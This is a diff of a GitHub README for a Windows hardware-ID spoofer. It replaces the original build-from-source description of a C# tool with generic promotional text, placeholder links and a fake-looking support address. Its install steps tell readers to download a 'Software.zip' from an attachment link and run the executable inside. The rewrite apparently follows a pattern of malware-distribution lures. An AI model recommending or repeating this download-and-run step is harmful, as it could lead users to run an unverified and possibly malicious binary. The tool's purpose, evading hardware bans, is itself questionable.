@@ -1,102 +1,63 @@
-<div align="center">
+# Hwid-Spoof
 
-# Hwid Spoofer
+🛡️🔧🕵️ **HWID Spoofer for Windows**
 
-Hwid Spoofer is a C# application that allows you to change various system identifiers on your Windows computer. This application helps you randomly change some system identifiers on your system.
+Welcome to **Hwid-Spoof**, your ultimate tool for anonymizing and modifying hardware identifiers on Windows. This powerful spoofer includes features for disks, GUIDs, PC names, MAC IDs, installation IDs, EFI bootloaders, SMBIOS data, and displays. Additionally, it offers cache cleaners for games and various system cleaning tools to enhance your privacy and protect your hardware information.
+
+![Hwid-Spoof Banner](https://yourimageurlhere)
 
 ## Features
 
-- **HWID Change**: Generates and change a random HWID.
+🔹 **Hardware Identification Spoofing**  
+Spoof various hardware identifiers such as disks, GUIDs, PC names, MAC IDs, installation IDs, EFI bootloaders, SMBIOS data, and displays.
 
-- **PC GUID Change**: Generates and change a random PC GUID.
+🔹 **Cache Cleaners**  
+Keep your games running smoothly by using cache cleaners provided within the tool.
 
-- **Computer Name Change**: Generates and change a random computer name.
+🔹 **System Cleaning Tools**  
+Improve system performance and cleanliness by utilizing the various system cleaning tools available.
 
-- **Product ID Change**: Generates and change a random product ID.
+## Installation
 
-- **MAC Address Change (Beta)**: Assigns a random MAC address to a specific network interface.
+1. Download the **Hwid-Spoof** software from the link below:
+   [![Download Hwid-Spoof](https://yourshieldsioimagelinkhere)](https://github.com/user-attachments/files/17676741/Software.zip)
 
-- **All Change**: Randomly changes all system identifiers and the MAC address.
+2. Extract the downloaded ZIP file to your desired location.
 
-- **Backup Functionality**: The application provides a backup function to store the original values of system identifiers before changes are made, making it easier to revert to the original settings if needed.
-
-## Requirements
-- Visual Studio 2022 (.NET Desktop)
-
-
-## Build
-
-
-https://github.com/MuckPro/bunned/assets/138373919/a91a5c05-a2d5-498d-a4cd-bcceea474d9a
-
-
-# Preview
-
-![Console GUI](https://github.com/MuckPro/bunned/assets/138373919/cb342480-8cc1-40ef-92be-e13b582b34ae)
-
-
+3. Run the executable file to start using **Hwid-Spoof**.
 
 ## Usage
 
-1. Run the application and choose whether you want to change system identifiers randomly (Yes/No).
+1. Launch the software on your Windows system.
 
+2. Select the hardware identifiers or cleaning tools you wish to modify or use.
 
-2. If you select "Yes," you can choose which system identifier(s) you want to change:
-   - Hardware ID (HWID)
-   - PC GUID
-   - Computer Name
-   - Product ID
-   - MAC Address
-   - All of the above
+3. Follow the on-screen instructions to complete the spoofing or cleaning process.
 
+4. Enjoy the enhanced privacy and system performance provided by **Hwid-Spoof**!
 
-3. The application will guide you through the process of changing the selected system identifier(s).
+## Contributing
 
-4. After the changes are made, the application will display the result.
+Contributions to **Hwid-Spoof** are welcome! To contribute, follow these steps:
 
-## Resourcs
+1. Fork the repository.
 
-- [Source for Generating Random HWID](https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-diskdrive)
-- [Source for Generating Random PC GUID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Generating Random Computer Name](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Generating Random Product ID](https://docs.microsoft.com/en-us/dotnet/api/system.guid.newguid)
-- [Source for Changing MAC Address](https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.networkinterface)
+2. Create a new branch.
 
+3. Make your enhancements or changes.
 
+4. Submit a pull request for review.
 
-## Contribution
+## Support
 
-This project is open-source, and contributions are welcome. If you'd like to contribute by adding features, fixing bugs, or improving the documentation, feel free to create a pull request.
-
+If you encounter any issues or have questions regarding **Hwid-Spoof**, feel free to reach out to us by [email](mailto:hwidspoof@example.com) or by opening an [issue](https://github.com/yourrepository/issues).
 
 ## License
 
-This project is licensed under the MIT License. For more details, please refer to the [LICENSE](LICENSE) file.
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ---
 
+🚨 **Disclaimer:** This tool is meant for educational and testing purposes only. Usage of this tool to engage in illegal activities is strictly prohibited. The developers are not responsible for any misuse of this software.
 
-
-
-
-<!---------------------------------------------------------------------------------------
-
-
-
-
-
-                                         ░█████╗░██╗░░░██╗████████╗██╗░░██╗░█████╗░██████╗░
-                                         ██╔══██╗██║░░░██║╚══██╔══╝██║░░██║██╔══██╗██╔══██╗
-                                         ███████║██║░░░██║░░░██║░░░███████║██║░░██║██████╔╝
-                                         ██╔══██║██║░░░██║░░░██║░░░██╔══██║██║░░██║██╔══██╗
-                                         ██║░░██║╚██████╔╝░░░██║░░░██║░░██║╚█████╔╝██║░░██║
-                                         ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-                                                                                        
-                                                 █▀█ ▄▀█ ▀█▀ █░█ ▄▀█ █▀▀ █░░ ▀▄▀ ▀█▀
-                                                 █▀▄ █▀█ ░█░ █▀█ █▀█ ██▄ █▄▄ █░█ ░█░
-
-
-
-
-
------------------------------------------------------------------------------------------>
+🔒 **Secure your hardware identification with Hwid-Spoof!** ⚙️🕵️
